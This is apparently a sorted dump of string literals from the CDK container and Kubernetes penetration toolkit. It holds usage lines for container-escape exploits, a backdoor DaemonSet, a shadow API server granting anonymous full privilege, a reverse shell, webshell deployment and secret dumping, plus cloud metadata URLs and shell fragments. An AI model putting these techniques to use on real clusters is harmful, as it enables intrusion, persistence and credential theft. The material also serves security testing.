"""deploy image to every node using daemonset, usage: cdk run k8s-backdoor-daemonset (default|anonymous|<service-account-token-path>) <image> <cmd>"
"""details"
"""dev"
"""deviceName"
"""devices in total."
"""devices"
"""devices.allow content: %s"
"""devices.allow"
"""devices.list"
"""disableOOMKiller"
"""discovery"
"""dns"
"""dns-tcp"
"""dnsPolicy"
"""docker run -v {}:{} --rm {} {} /bin/sh -c \"
"""docker"
"""docker-api"
"""docker-api-pwn"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller@sha256:498b6ef55f40282853d5b2ec24da4adba0f57ada2cebfa9e24edfe1bd9597a1a"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller@sha256:62b7e69c72b8e0d895ca7006c55cd3a053e664d071955fdafe374dbf61105f52"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper@sha256:a82eaef4c266219538a5f470d758dfc0957bd24e81949431933a1406c47f8ef4"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager@sha256:37348e10cd00c02360527343a2863e7bedd2fc65c23c3f2464af5dc7efb5b2c6"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller@sha256:bef118e653cfd65dc097009981e49cd651539627b8f90b5c22fe4d90d5e2e679"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/busybox@sha256:5e8e0509e829bb8f990249135a36e81a3ecbe94294e7a185cc14616e5fad96bd"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64@sha256:780116bf9a2ac7bfecc12e5c976200d656a702f9122502a96cacfcad7d3834f9"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/coredns@sha256:4dd4d0e5bcc9bd0e8189f6fa4d4965ffa81207d8d99d29391f28cbd1a70a0163"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume@sha256:b17527284ff2c593e0a68b114494b2ebad044004e86a94c94047f2d2771e7e1b"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler@sha256:ca6c8fdb476ef0541b38da740a11f7e7ccd01842bd0a3421ffb62b4aa1eadcb4"
"""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/metrics-server@sha256:a8b5b9eb3964d508dbc2edd7b7b980633c55c24eadb5852c183c21782b67515d"
"""docker-sock-check"
"""docker-sock-pwn"
"""docker://04d1c794694bd4e27ce71374b6455ee3984b13b154384db61c6ad16511328d07"
"""docker://0509f783f0726a4f924dfa73823f6134103a44de432191414db688aacad9bba7"
"""docker://07a3b26a814dfcdf8643db99e97833487233e3f859b49cf09b80326c3e8c1d3c"
"""docker://0913be067bdbe34a11120e12c0a65c07cdf856447b8ecf7e3f26c527aff67237"
"""docker://09d089725237d30a38e2058da1fd8b6dbc671ddb61997b0b04af19907b82e7e1"
"""docker://09e161af05eb22861527b8cf4052f2f11ebaed325bb97c4b574a310721bf3ffe"
"""docker://11c5e8dbbffb6d1cc601d211be42873542271ac87073dd1461ea6d6553c0c138"
"""docker://1d50836144b1807267d3b00107e6858dcf87dc1fd1065ef5d6c6d746aa5209a3"
"""docker://1f015d12fff55c6908d3a848471c96351afda5347e9c2b3853af0f645dc834f3"
"""docker://204a05eafbbe413fba42031de977db911a80032a2dcdaa7883211eb662bc551a"
"""docker://273680e9106de1bc3f1660839bf2f4e9322d4e0d6f7af77ad56c3f8865b36b8b"
"""docker://2ba1f9a5390f9af1b61e8a0101f872a85b510f4af4b87aa9f5b2a4fca30657c0"
"""docker://3093694fba5620cf7bf7213a95dbd10e00e660ca12098372733ef9aaa73a1417"
"""docker://3963ea096e0f6d079045ece4689f08235e82ed60db63ce6b7ed3bd39d2170458"
"""docker://3ae2d8464413d193546c31e1ee4bfe0d1f832fd52c2583b91f4e80bafc60e7fc"
"""docker://3d16ef6d38358857f4aab186e73dec8f0c7339453540de0425b74aaa20395855"
"""docker://48004de77599d15d19b5336e01405579b922ae607c84fe4b5856884446f1f18e"
"""docker://4ab12460c914840ef86e6096faa438339096d5c0e6da88c66dd2b9ac47f76c0d"
"""docker://4c9610e623f19098a3702d632a84bf6284ab232627d986e9d99fba0f3a621ca0"
"""docker://4ef30a4da0ac22571d6208489ddbf7e5a57788c2c3094e9df6d18678436b1c5f"
"""docker://587d3eba0a667b7398654099f45e29fcaf3728c5f164a89e693a895c3132252c"
"""docker://612cd2c7815ee0ca70b278051b01129007c7d2d2d5c946d6a6c3d6ca55fab92a"
"""docker://65cd60d6c7398c72c0e56481028dcd099993f248c7cfe6a5b6efea8b03de76b5"
"""docker://6cf0fd06830849a8f4db52213fba2fd59dc3e3aac74b04dbea43f93106888bfb"
"""docker://6e8f580e56d50ab4315db999ce2434dad545e3d652d97a83c808c62bd7dbf75f"
"""docker://75c278c7ac29095b0f6114bf475ddb37152f36eb037244a9c21d82b606dc556a"
"""docker://7c58ea1cb003d9ae74cd29eba230e3c0371991db11e36a2ce304759ce22efff3"
"""docker://7d1bd7aa0c44eb838dae70b86857e4530fd3188aca2505d02eee995a425cc341"
"""docker://85456ba47f9dd887c4ba158fc86885e8cd52dbf662c10dbbe5682d0f0ddcb2d4"
"""docker://8954f7e618772b2b2a16525fdfa7c75dee71dbdaedd0f087d477820c9db88ce7"
"""docker://8ede39f430000f0f15d891b43181655fdaabc7496b78aaf4f332582533524d8e"
"""docker://9344a4a0b58a001fd38d2e349ce5893d4b355984227a5a2f5e144999ddec2df6"
"""docker://992cb3ccc8d8befb3f2c889838478e7270d66d0d5e5b2315bd93ea7e2f9fb425"
"""docker://99dd49254f15530507286069a374e6b38ed814cd926378f1a975aaf7dd27ee29"
"""docker://9f515c40e3fd5d9c2d99cdf6c3c95b109eca48c6f789ba9d8dc85fed1e6550c2"
"""docker://a2fe681655f7e79a0c7ee942e9a56f9d45d72e5b16631625fd06d14750c3a79e"
"""docker://a3b571469d988545b50e68e9ce9e24d763f0d1ddfdcbd450379df1ba4edab4f0"
"""docker://b94f3946e44f89210a14788e570039a8f19cd5fc89b53c5362499f65fa270142"
"""docker://bef05721cc796bcae7edfedccabe377ab82671b678f3755dfe65587a7642c3c3"
"""docker://c9020e853dcded6316d05926cca0830ca4adcd5fef68b8b3d0880560b3bed34c"
"""docker://cd2fbdf2a0b47875d8714ce3859add7ce1c2869baedf2d15012c1b57b2ab4bdc"
"""docker://cd96ddf6bcedd5271222e33136a72bd7e766810d8af2d079c57bee0fecb8b067"
"""docker://cf0ae816d665f706fa0131c54dea7d3adf81957066b7b3f62eb49fc2c97a3591"
"""docker://d05f598cdce391445876d280cb38b141ad9c914e0a18e2c7d12ba4a215750499"
"""docker://d4d605b9579b78611cc77a198455e54d50a7a14957779c3c75112b423fc47242"
"""docker://d9ca116d797c8be92c930e377510af17bab00d32aef59c6592cf610b1fc965eb"
"""docker://e1b6d1656a432be53cd23ebd02c75d8249556a8976e9fb4c312c94480aaae195"
"""docker://e6b39e8558945aa0943c5daffca465205aa932ae574e5d236b7a73a0e7afd376"
"""docker://e75d968cc7b54f61e5f5703ab81bd55699c314c17fa3c7c7048a5c99177d6946"
"""docker://ea914da329aba6450d865eb6e65df2a5bca07584bc6660c4fabf8adc0c39897a"
"""docker://f28268e8e1098db0022d78c9a8d3bc07c65f0826dc7fa49b712e3981ceff0da9"
"""docker://f9a6743f6056c7c58f7cfcea0ab2ad46c9ac83f78670b0153964d4aff82b48be"
"""docker://fa0bc6f12f5f04b95c3bca042e7c44b856988fb20dca26b48db60eab9b3d0841"
"""docker://fd4ad685db257927caacea7a42cb0745b2d19b16f1e18a47d174263a3da2fe59"
"""docker://fdd7e693a5231fb6415b9713fc3699b39d8f1a8f72c1cf092bbd7461c4af3078"
"""docopt err: "
"""dpkg"
"""drop"
"""dump Pod Security Policies success, saved in: "
"""dump config json of pod:"
"""dump configmap success, saved in: "
"""dump secret success, saved in: "
"""duplicate kube-apiserver pod, disable logs and grant all privilege to anonymous user. usage: cdk run k8s-shadow-apiserver (default|anonymous|<service-account-token-path>)"
"""e"
"""e2013abd-55f9-4536-9191-2608ed515aac"
"""e2d1399d-4a4d-4d46-a1ed-9db5de9279eb"
"""e620619d-c1d3-4343-9acf-94acf759307f"
"""echo \"
"""echo \$\$ > /mnt/cgrp1/x/cgroup.procs"
"""echo \$\$ > /tmp/cgrp/cdk/cgroup.procs"
"""echo helloworld"
"""ectl"
"""edbc982c-c412-43b7-a404-2cf84b5bebde"
"""effect"
"""embed"
"""enableServiceLinks"
"""enabled: "
"""encoding/base64"
"""encoding/binary"
"""encoding/json"
"""ending; @args is ips: %v, max parallels:%v, timeout:%v\n"
"""env GOTRACEBACK not found, trying to set GOTRACEBACK=crash then reload exploit."
"""env"
"""err found in post request, error response code: %v."
"""err found in post request."
"""err found when parse input arg <parallel>"
"""err found when parse input arg <timeout-ms>"
"""err found when reading /proc dir:"
"""err found while generate post request in net.http ."
"""err found while getting K8s apiserver address."
"""err found while open %s: %v\n"
"""err found while open"
"""err found while requesting K8s apiserver."
"""err found while searching local K8s apiserver addr."
"""err found while stat docker.sock path."
"""err found while writing shellcode to host crontab from container."
"""err: "
"""err: cannot find kubernetes api host in ENV"
"""error found when gene ip list to scan task"
"""error stdout: %s"
"""error when requesting coreDNS: %s\n"
"""errors"
"""escape container by cgroup when root has LXCFS read & write privilege,  usage: `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`"
"""escape container by syscall mknod when root has LXCFS read & write privilege,  usage: `./cdk run lxcfs-rw`"
"""escape container via mounted procfs. usage: cdk run mount-procfs <dir> \"
"""escape privileged container via disk mount, usage: `./cdk run mount-disk`"
"""escape sys_admin capabilities container via rewrite cgroup devices.allow. usage: ./cdk run rewrite-cgroup-devices."
"""escaping"
"""etc"
"""etc-pki"
"""etcd"
"""etcd-get-k8s-token"
"""etcdcluster"
"""etcdir"
"""etcdserver"
"""eva"
"""evaluate"
"""example: cdk probe 192.168.1.0-255 22,80,100-110 50 1000"
"""example: cdk run mount-procfs /mnt/host_proc \"
"""exec"
"""executing command(%s)...\n"
"""exitCode"
"""exploit failed"
"""exploit failed."
"""exploit mount-disk failed."
"""exploit only suitable for cgroup v1"
"""exploit success"
"""exploit success, run \"
"""exploit success, shellcodes wrote to: "
"""exploit success."
"""exploit-db: "
"""ext"
"""ext-url: "
"""extensions/v1beta1"
"""externalIPs"
"""eyJh[\\w\\.-]+"
"""f0f163ce-3709-4e3d-a3ec-fd6d38b3a87b"
"""f11a2be7-7c74-48d7-8d1d-a88081d6f8fe"
"""fail to connect remote addr: "
"""fail to connect unix socket "
"""fail to create mount dir in:%s"
"""faild to request api-server."
"""failed to create container via unix socket http request."
"""failed to dial %s API."
"""failed to find docker abs path in /proc/self/mounts"
"""failed to find docker devicemapper abs path in /proc/self/mounts"
"""failed to get api-server response"
"""failed to get container ID after created."
"""failed to get server version: %v"
"""failed to pull docker image via unix socket http request."
"""failed to send http request to unix socket."
"""failed to start container via unix socket http request."
"""failed to write file."
"""failed, 403 Forbidden, api-server response:"
"""failed, api-server response:"
"""failureThreshold"
"""false"
"""fb6b595bf06e476799e506ef26ec872f"
"""fc0694b4-e460-4d4f-80ad-459dd76579c3"
"""fdisk"
"""feature: "
"""fedora"
"""field gitVersion not found in response"
"""field"
"""fieldPath"
"""fieldRef"
"""fieldsType"
"""fieldsV1"
"""file"
"""filter string for mount point is \"
"""filter-string"
"""final shell exploit is: \n\n"
"""find api-server pod:"
"""find cgroup devices.allow file: %s\n"
"""find release agent path %s"
"""find release agent subsystem error"
"""find"
"""finished."
"""finishedAt"
"""flag"
"""flannel"
"""flannel-cfg"
"""flannel-token-pblrl"
"""flexvolume"
"""flexvolume-"
"""flexvolume-652kv"
"""flexvolume-dbmzf"
"""flexvolume-gfzzw"
"""flexvolume-hps4x"
"""flexvolume-lvxmt"
"""flexvolume-x9wvb"
"""fmt"
"""force-fuzz"
"""found "
"""found host blockDeviceId Major: %s Minor: %s\n"
"""found invalid mountinfo line in file %s: %s "
"""found pod devices.allow path: %s\n"
"""found rw lxcfs mountpoint: %s\n"
"""found"
"""freebsd"
"""fsGroup"
"""g++"
"""gbk"
"""gcc"
"""generate cgroup dir: %s\n"
"""generate cronjob with \n image:%s\n cmd:%s\n schedule:%s\n"
"""generate shell exploit with user-input cmd: \n\n%s\n\n"
"""generateName"
"""generateName,omitempty"
"""get /sys/fs/cgroup/devices/devices.allow inode error: %s\n"
"""get /sys/fs/cgroup/devices/devices.allow inode id: %d\n"
"""get mount info error: %v"
"""get process list failed."
"""get"
"""getting K8s api-server API addr."
"""gid"
"""gid:"
"""gid_map setgroups failed"
"""git"
"""gitVersion"
"""github.com/axgle/mahonia"
"""github.com/bkthomps/Ven/screen"
"""github.com/cdk-team/CDK/conf"
"""github.com/cdk-team/CDK/pkg/cli"
"""github.com/cdk-team/CDK/pkg/errors"
"""github.com/cdk-team/CDK/pkg/evaluate"
"""github.com/cdk-team/CDK/pkg/exploit"
"""github.com/cdk-team/CDK/pkg/exploit/base"
"""github.com/cdk-team/CDK/pkg/exploit/credential_access"
"""github.com/cdk-team/CDK/pkg/exploit/discovery"
"""github.com/cdk-team/CDK/pkg/exploit/escaping"
"""github.com/cdk-team/CDK/pkg/exploit/persistence"
"""github.com/cdk-team/CDK/pkg/exploit/privilege_escalation"
"""github.com/cdk-team/CDK/pkg/exploit/remote_control"
"""github.com/cdk-team/CDK/pkg/plugin"
"""github.com/cdk-team/CDK/pkg/task"
"""github.com/cdk-team/CDK/pkg/tool/dockerd_api"
"""github.com/cdk-team/CDK/pkg/tool/etcdctl"
"""github.com/cdk-team/CDK/pkg/tool/kubectl"
"""github.com/cdk-team/CDK/pkg/tool/netcat"
"""github.com/cdk-team/CDK/pkg/tool/netstat"
"""github.com/cdk-team/CDK/pkg/tool/network"
"""github.com/cdk-team/CDK/pkg/tool/probe"
"""github.com/cdk-team/CDK/pkg/tool/ps"
"""github.com/cdk-team/CDK/pkg/tool/vi"
"""github.com/cdk-team/CDK/pkg/util"
"""github.com/cdk-team/CDK/pkg/util/capability"
"""github.com/containerd/containerd/runtime/v1/shim/v1"
"""github.com/containerd/ttrpc"
"""github.com/docopt/docopt-go"
"""github.com/fatih/color"
"""github.com/gdamore/tcell"
"""github.com/gdamore/tcell/encoding"
"""github.com/hashicorp/go-version"
"""github.com/idoubi/goz"
"""github.com/mitchellh/go-ps"
"""github.com/shirou/gopsutil/v3/disk"
"""github.com/shirou/gopsutil/v3/host"
"""github.com/shirou/gopsutil/v3/net"
"""github.com/shirou/gopsutil/v3/process"
"""github.com/stretchr/testify/assert"
"""github.com/tidwall/gjson"
"""github.com/tidwall/sjson"
"""golang.org/x/sync/semaphore"
"""golang.org/x/sys/unix"
"""h"
"""hVfbsu:k:dp:g"
"""happy escaping!"
"""headers"
"""help"
"""help,version,full,fetch-binaries,fetch-sources,uname:,kernel:,show-dos,pkglist-file:,short,kernelspace-only,userspace-only,skip-more-checks,skip-pkg-versions,cvelist-file:,checksec"
"""highly probable"
"""home:"
"""hooks"
"""host addr to connect or listen"
"""host os does NOT enable unprivileged user namespace."
"""host port to connect or listen"
"""host"
"""host-volume"
"""hostIP"
"""hostIPC"
"""hostNetwork"
"""hostPID"
"""hostPath"
"""hostPort"
"""hostname"
"""hostname:"
"""hour"
"""http"
"""http-1"
"""http.NewRequest error: %v\n"
"""http://"
"""http://100.100.100.200/latest/meta-data/"
"""http://100.80.80.80/meta-data/latest/uhost/"
"""http://127.0.0.1/containers/"
"""http://127.0.0.1/containers/create"
"""http://127.0.0.1/images/create?fromImage="
"""http://127.0.0.1/info"
"""http://127.0.0.1:2379"
"""http://169.254.169.254/latest/meta-data/"
"""http://169.254.169.254/metadata/instance"
"""http://169.254.169.254/openstack/latest/meta_data.json"
"""http://httpbin.org/get"
"""http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true"
"""http://metadata.tencentyun.com/latest/meta-data/"
"""httpGet"
"""httpd"
"""https"
"""https-1"
"""https://"
"""https://%s:10250/"
"""https://cloud.google.com/compute/docs/storing-retrieving-metadata"
"""https://cloud.tencent.com/document/product/213/4934"
"""https://contrib.rocks/image?repo=cdk-team/cdk"
"""https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
"""https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service"
"""https://docs.openstack.org/nova/rocky/user/metadata-service.html"
"""https://docs.ucloud.cn/uhost/guide/metadata/metadata-server"
"""https://github.com/cdk-team/cdk/graphs/contributors"
"""https://github.com/mzet-/linux-exploit-suggester"
"""https://help.aliyun.com/knowledge_detail/49122.html"
"""https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}"
"""https://www.exploit-db.com/download/$EXPLOIT_DB"
"""https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
"""hw"
"""i386"
"""i686"
"""if debugfs can not used, may be you can try to run `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`"
"""if you see \"
"""ifconfig"
"""image"
"""imageID"
"""imagePullPolicy"
"""image\"
"""import cycle"
"""in namespace:"
"""infinity"
"""ingress-nginx"
"""init-sysctl"
"""initContainerStatuses"
"""initContainers"
"""initialDelaySeconds"
"""install-cni"
"""instance-id"
"""instance-name"
"""invalid /proc dir path:"
"""invalid input args, Example: ./cdk dcurl get http://127.0.0.1:2375/info \"
"""invalid input args, Example: ./cdk ucurl get /var/run/docker.sock http://127.0.0.1/info \"
"""invalid input args. Usage: cdk run deploy-webshell (php|jsp) <filepath>."
"""invalid input args."
"""invalid response data, possible caused by api-server forbidden this request."
"""invalid reverse shell remote addr: "
"""invalid to list pods, possible caused by api-server forbidden this request."
"""io"
"""io/ioutil"
"""ip addr\"
"""ip"
"""ipType\t\tconnection\tlocalAddr\t\t\tstatus\t\t\tremoteAddr\t\t\tpid\n"
"""ipc"
"""ipv4\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"
"""ipv4\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"
"""ipv6\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"
"""ipv6\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"
"""istio-check"
"""items"
"""java"
"""jobTemplate"
"""jsp"
"""k8s"
"""k8s-api-server"
"""k8s-app"
"""k8s-audit"
"""k8s-backdoor-daemonset"
"""k8s-certs"
"""k8s-configmap-dump"
"""k8s-cronjob"
"""k8s-get-sa-token"
"""k8s-kubelet-var-log-escape"
"""k8s-mitm-clusterip"
"""k8s-psp-dump"
"""k8s-secret-dump"
"""k8s-shadow-apiserver"
"""k8s_configmaps.json"
"""k8s_pod_security_policies.json"
"""k8s_secrets.json"
"""kcurl"
"""kernel"
"""kernel:"
"""key"
"""key\"
"""keys_only\"
"""kind"
"""kind\"
"""kube-apiserver"
"""kube-apiserver-10.206.0.11-shadow"
"""kube-apiserver-cn-beijing.192.168.0.150"
"""kube-apiserver-cn-beijing.192.168.0.151"
"""kube-apiserver-cn-beijing.192.168.0.152"
"""kube-apiserver-ubuntu-linux-20-04-desktop"
"""kube-controller-manager"
"""kube-controller-manager-cn-beijing.192.168.0.150"
"""kube-controller-manager-cn-beijing.192.168.0.151"
"""kube-controller-manager-cn-beijing.192.168.0.152"
"""kube-dns"
"""kube-flannel"
"""kube-flannel-cfg"
"""kube-flannel-ds"
"""kube-flannel-ds-"
"""kube-flannel-ds-5mdcn"
"""kube-flannel-ds-9xgjv"
"""kube-flannel-ds-b6qmx"
"""kube-flannel-ds-fkbtg"
"""kube-flannel-ds-fsjhn"
"""kube-flannel-ds-ssx5g"
"""kube-proxy"
"""kube-proxy-master"
"""kube-proxy-master-"
"""kube-proxy-master-bpgdm"
"""kube-proxy-master-rj7q5"
"""kube-proxy-master-xwcsf"
"""kube-proxy-token-9ngpd"
"""kube-proxy-worker"
"""kube-proxy-worker-"
"""kube-proxy-worker-84qsm"
"""kube-proxy-worker-dfq46"
"""kube-proxy-worker-p77nb"
"""kube-scheduler"
"""kube-scheduler-cn-beijing.192.168.0.150"
"""kube-scheduler-cn-beijing.192.168.0.151"
"""kube-scheduler-cn-beijing.192.168.0.152"
"""kube-system"
"""kubeconfig"
"""kubectl version --client"
"""kubectl"
"""kubectl-proxy"
"""kubectl.kubernetes.io/last-applied-configuration"
"""kubelet-auth"
"""kubelet-exec"
"""kubelet-read"
"""kubeletdir"
"""kubernetes.io/config.hash"
"""kubernetes.io/config.mirror"
"""kubernetes.io/config.seen"
"""kubernetes.io/config.source"
"""kubernetes.io/hostname"
"""kubernetes.io/psp"
"""kvs"
"""l"
"""labelSelector"
"""labels"
"""labels,omitempty"
"""lastProbeTime"
"""lastState"
"""lastTransitionTime"
"""less probable"
"""lib-modules"
"""limits"
"""linux darwin"
"""linux"
"""linux-exploit-suggester "
"""linux-kernel"
"""list"
"""listen mode"
"""livenessProbe"
"""load K8s service account token error."
"""localAddresses: %v\n"
"""localtime"
"""log list: \n%s"
"""log"
"""logdir"
"""ls -l /run/flannel/subnet.env"
"""ls /acs/flexvolume"
"""ls /alicloud-disk-controller"
"""lxcfs"
"""lxcfs-rw"
"""lxcfs-rw-cgroup"
"""mageia"
"""make"
"""managedFields"
"""manager"
"""manjaro"
"""matchExpressions"
"""matchFields"
"""matchLabels"
"""math/rand"
"""memory"
"""merged"
"""message"
"""metadata"
"""metadata.annotations"
"""metadata.creationTimestamp"
"""metadata.labels"
"""metadata.labels.component"
"""metadata.name"
"""metadata.namespace"
"""metadata.resourceVersion"
"""metadata.selfLink"
"""metadata.uid"
"""metadata\"
"""metrics"
"""metrics-server"
"""metrics-server-54575fbd57"
"""metrics-server-54575fbd57-"
"""metrics-server-54575fbd57-rf9bl"
"""min"
"""misc"
"""mitm-externalip"
"""mitm-payload-deploy"
"""mknod err: %v"
"""monitoring"
"""mount -o remount rw /proc/sys\nsysctl -w net.core.somaxconn=65535\nsysctl -w net.ipv4.ip_local_port_range=\"
"""mount -t cgroup -o devices devices /tmp/cdk_dcgroup**"
"""mount error. possible reason: target container is not privileged."
"""mount syscall failed"
"""mount"
"""mount-cgroup"
"""mount-disk"
"""mount-procfs"
"""mountPath"
"""mountPropagation"
"""mysql"
"""mysql-client"
"""n"
"""name"
"""name,omitempty"
"""name\"
"""namespace"
"""namespace,omitempty"
"""namespace\"
"""namespaces"
"""nc -lvp 999"
"""nc"
"""nearcontainer"
"""net"
"""net.ipv4.conf.all.route_localnet = %s"
"""net.ipv4.ip_local_port_range"
"""net.ipv4.tcp_fin_timeout"
"""net/http"
"""net/url"
"""netcat"
"""netstat -antup"
"""netstat"
"""network protocol"
"""network"
"""nginx"
"""nginx-ingress-controller"
"""nginx-ingress-controller-5495b9fccf"
"""nginx-ingress-controller-5495b9fccf-"
"""nginx-ingress-controller-5495b9fccf-6q5z2"
"""nginx-ingress-controller-5495b9fccf-dtr8n"
"""nginx-ingress-controller-token-whd5r"
"""nil"
"""no default gateway found"
"""no dir in the %s"
"""no such file or directory"
"""node"
"""node-role.kubernetes.io/master"
"""node.cloudprovider.kubernetes.io/uninitialized"
"""node.kubernetes.io/disk-pressure"
"""node.kubernetes.io/memory-pressure"
"""node.kubernetes.io/network-unavailable"
"""node.kubernetes.io/not-ready"
"""node.kubernetes.io/pid-pressure"
"""node.kubernetes.io/unreachable"
"""node.kubernetes.io/unschedulable"
"""nodeAffinity"
"""nodeName"
"""nodeSelector"
"""nodeSelectorTerms"
"""nodeport-service"
"""none"
"""not privileged container."
"""now, run 'debugfs -w cdk_mknod_result' to browse host files."
"""npm"
"""ociVersion"
"""open %s: %s:%d\n"
"""open devices.allow failed. %v\n"
"""open devices.list failed. %v\n"
"""operation"
"""operator"
"""operator: $operator"
"""os"
"""os/exec"
"""os/signal"
"""os/user"
"""overlay"
"""overwrite file:"
"""owner"
"""ownerReferences"
"""p"
"""parse cdk main failed, name: %s, args: %v, buf: %s"
"""parse cdk main failed, name: %s, args: %v, buf: %s, out: %s"
"""password dict length: %d.\n"
"""path"
"""path/filepath"
"""periodSeconds"
"""perl"
"""persistence"
"""phase"
"""php"
"""pkg: $pkg"
"""pki"
"""pod-template-generation"
"""pod-template-hash"
"""podAffinityTerm"
"""podAntiAffinity"
"""podIP"
"""podIPs"
"""port"
"""ports"
"""ports,omitempty"
"""post"
"""preference"
"""preferences"
"""preferredDuringSchedulingIgnoredDuringExecution"
"""prestart"
"""print this help"
"""printed page"
"""priority"
"""priorityClassName"
"""privilege-escalation"
"""privileged"
"""probable"
"""probe"
"""proc"
"""process"
"""prometheus.io/path"
"""prometheus.io/port"
"""prometheus.io/scrape"
"""protocol"
"""ps -ef | grep aliyun-acr-credential-helper | grep -v grep"
"""ps -ef | grep aliyun-app-manager | grep -v grep"
"""ps -ef |grep alicloud-monitor-controller"
"""ps -ef"
"""ps aux > $host_path/output"
"""ps"
"""ps.Processes() Failed, are you using windows?"
"""pwn CVE-2020-15257,start a privileged reverse shell to remote host or execute cmd. usage: \"
"""python"
"""python2"
"""python2.7"
"""python3"
"""qosClass"
"""range_end\"
"""rbac.authorization.k8s.io"
"""rdma"
"""read devices.list failed. %v\n"
"""read execution result file error %s"
"""read execution result file error"
"""readOnly"
"""readOnlyRootFilesystem"
"""readinessProbe"
"""ready"
"""reason"
"""recover from panic:"
"""refer"
"""regexp"
"""registry-brute"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-disk-controller:v1.14.8.37-bd3fd891-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/alicloud-monitor-controller:v1.1.0"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-acr-credential-helper:v20.03.16.0-36d5d7e-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-app-lifecycle-manager:v0.1.0.1-f832bed-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller:v0.30.0.1-5f89cb606-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/cloud-controller-manager-amd64:v1.9.3.239-g40d97e1-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/flexvolume:v1.14.8.66-1d0843f-aliyun"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-scheduler:v1.16.6-aliyun.1"
"""registry-vpc.cn-beijing.aliyuncs.com/acs/metrics-server:v0.2.1-9dd9511-aliyun"
"""release_agent is not writable %s"
"""release_agent is not writable"
"""remote-control"
"""replicas"
"""request apiserver uri `%s` error: %v, response: %s"
"""request data:"
"""requesting "
"""requests"
"""required version: $version"
"""requiredDuringSchedulingIgnoredDuringExecution"
"""resourceVersion"
"""resourceVersion,omitempty"
"""resources"
"""respone error: %s"
"""response data:"
"""response:"
"""response_data:"
"""restartCount"
"""restartPolicy"
"""return True."
"""reverse shell to remote addr, usage: cdk run reverse-shell <ip:port>"
"""reverse"
"""reverse-shell"
"""rewrite-cgroup-devices"
"""root"
"""rootfs"
"""rpc error response."
"""ruby"
"""rule { %s: %s } is not allowed."
"""run command error :"
"""run mount -t cgroup -o devices devices /tmp/cdk_dcgroup** error: %s\n"
"""run success"
"""run"
"""runAsGroup"
"""runAsNonRoot"
"""runAsUser"
"""runc"
"""runc-pwn"
"""running"
"""running,omitempty"
"""runtime"
"""rw"
"""rwm"
"""s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g"
"""s,\[CVE-[0-9]+-[0-9]+\].*,${SED_RED},g"
"""scan subnet to find Docker/K8s inner services, usage: cdk run service-probe 192.168.1.0-255"
"""scanning %v with user-defined ports, max parallels:%v, timeout:%v\n"
"""scanning use time:%vms\n"
"""schedule"
"""scheduler.alpha.kubernetes.io/critical-pod"
"""schedulerName"
"""scheme"
"""search AK/Secrets from input dir, usage: cdk run ak-leakage <dir>"
"""searching secrets in "
"""secret"
"""secretName"
"""section:"
"""securityContext"
"""selector"
"""self"
"""selfLink"
"""sensitive env found:\n\t%s"
"""server"
"""service found in process:\n\t%d\t%d\t%s\n"
"""service-probe"
"""serviceAccount"
"""serviceAccountName"
"""service_account\"
"""set %s\n"
"""set -e -x; cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf"
"""set GOTRACEBACK env failed:"
"""set all block device accessible success.\n"
